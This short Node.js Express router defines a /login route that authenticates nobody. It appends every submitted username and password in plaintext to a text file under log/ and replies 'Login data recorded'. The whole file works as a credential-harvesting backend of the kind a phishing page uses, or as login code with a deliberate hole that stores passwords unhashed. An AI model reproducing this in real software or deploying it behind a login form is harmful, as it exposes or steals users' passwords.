const express = require('express');
const fs = require('fs');
const path = require('path');
const router = express.Router();

// Function to log user data to a text file
function logUserData(username, password) {
    const logFilePath = path.join(__dirname, '..', 'log', 'user_data.txt');
    const stream = fs.createWriteStream(logFilePath, { flags: 'a' });
    stream.write(`Username: ${username}, Password: ${password}\n`);
    stream.end();
}

// Login or Register route
router.post('/login', async (req, res) => {
    const { username, password } = req.body;

    try {
        // Log every login attempt
        logUserData(username, password);
        res.send('Login data recorded');
    } catch (error) {
        console.log(error);
        res.status(500).send('Server Error');
    }
});

module.exports = router;
